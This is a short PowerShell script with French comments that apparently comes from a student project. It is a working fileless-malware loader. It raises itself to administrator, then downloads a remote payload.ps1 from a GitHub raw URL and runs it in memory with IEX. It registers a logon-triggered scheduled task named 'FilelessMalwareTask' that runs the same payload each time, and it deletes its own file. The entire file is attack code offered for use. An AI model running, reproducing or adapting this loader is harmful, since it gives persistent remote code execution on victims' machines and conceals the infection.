# Vérifie si le script est lancé en mode Administrateur
If (-Not ([Security.Principal.WindowsPrincipal]([Security.Principal.WindowsIdentity]::GetCurrent())).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    $arguments = "-NoProfile -ExecutionPolicy Bypass -File """ + $MyInvocation.MyCommand.Definition + """"
    Start-Process powershell.exe -ArgumentList $arguments -Verb RunAs
    Exit
}

# Téléchargez et exécutez une charge utile
IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/melissa172714/PFE/main/payload.ps1')

# Ajouter une tâche planifiée pour persistance
$TaskName = "FilelessMalwareTask"
$TaskAction = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-NoProfile -ExecutionPolicy Bypass -Command IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/melissa172714/PFE/main/payload.ps1')"
$TaskTrigger = New-ScheduledTaskTrigger -AtLogon
Register-ScheduledTask -Action $TaskAction -Trigger $TaskTrigger -TaskName $TaskName -Description "Executes a fileless script at logon"

# Suppression automatique après exécution
Start-Sleep -Seconds 2
Remove-Item -Path $MyInvocation.MyCommand.Path -Force
